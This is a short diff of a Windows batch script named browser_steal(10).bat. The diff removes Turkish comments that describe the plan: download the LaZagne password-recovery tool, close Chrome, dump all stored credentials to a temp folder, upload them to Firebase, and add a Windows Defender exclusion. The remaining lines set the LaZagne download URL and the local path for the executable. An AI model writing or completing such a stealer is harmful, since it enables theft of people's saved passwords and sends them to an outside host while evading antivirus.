@@ -1,12 +1,3 @@
-:: browser_steal(10).bat
-:: Çalışma mantığı:
-:: 1) LaZagne.exe’yi indir
-:: 2) Chrome’u kapat
-:: 3) Lazagne ile tüm credential’ları toplar, %TEMP%\results içine atar
-:: 4) Sonuçları Firebase’e upload eder
-:: 5) Windows Defender exclusion ekler (defender zaten kapalı diyorsunuz)
-
-:: 1. Hazırlık
 setlocal enabledelayedexpansion
 set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZ_EXE=%TEMP%\lazagne.exe"
